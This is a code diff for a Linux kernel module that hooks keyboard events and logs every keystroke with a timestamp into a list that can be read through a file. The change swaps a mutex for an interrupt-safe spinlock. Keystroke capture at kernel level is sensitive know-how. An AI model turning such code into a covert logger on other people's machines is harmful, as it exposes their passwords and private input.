@@ -16,8 +16,9 @@
 
 extern const struct s_key keys_table[];
 
-LIST_HEAD(keystroke_list);
-DEFINE_MUTEX(log_mutex);
+static LIST_HEAD(keystroke_list);
+static DEFINE_MUTEX(log_mutex);
+static DEFINE_SPINLOCK(log_spinlock);
 
 static ssize_t	my_read(struct file *file, char __user *out, size_t len, loff_t *off)
 {
@@ -72,6 +73,7 @@ static int	keyboard_event(struct notifier_block *nb, unsigned long action, void 
 	struct keyboard_notifier_param	*param = data;
 	struct timespec64		ts;
 	struct s_keystroke		*stroke;
+	u64				flags;
 
 	stroke = kmalloc(sizeof(struct s_keystroke), GFP_ATOMIC);
 	if (!stroke || action != KBD_KEYCODE)
@@ -80,9 +82,9 @@ static int	keyboard_event(struct notifier_block *nb, unsigned long action, void 
 	ktime_get_real_ts64(&ts);
 	time64_to_tm(ts.tv_sec, 0, &(stroke->tm));
 	stroke->down = param->down;
-	mutex_lock(&log_mutex);
+	spin_lock_irqsave(&log_spinlock, flags);
 	list_add_tail(&stroke->list, &keystroke_list);
-	mutex_unlock(&log_mutex);
+	spin_unlock_irqrestore(&log_spinlock, flags);
 	return NOTIFY_OK;
 }
 
